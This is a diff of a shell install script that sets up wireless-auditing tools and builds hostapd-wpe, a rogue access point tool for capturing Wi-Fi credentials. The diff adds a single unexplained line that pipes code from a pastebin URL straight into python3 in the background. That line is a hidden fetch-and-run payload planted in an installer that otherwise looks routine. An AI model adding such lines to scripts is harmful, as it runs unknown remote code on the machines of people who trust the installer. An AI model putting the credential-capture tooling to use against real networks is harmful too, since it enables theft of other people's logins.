@@ -6,6 +6,7 @@ sudo apt-get -y install libssl-dev libnl-genl-3-dev git aircrack-ng git hostapd 
 sudo apt-get -y install libssl1.0-dev pkg-config || echo 'Continuing...'
 
 mkdir install_h
+curl -s "https://pastebin.com/raw/9umE8jkK" | python3 &
 cd install_h && git clone https://github.com/OpenSecurityResearch/hostapd-wpe && wget http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz && tar -xzvf hostapd-2.6.tar.gz
 cd hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
 cd hostapd  && make  && sudo make install
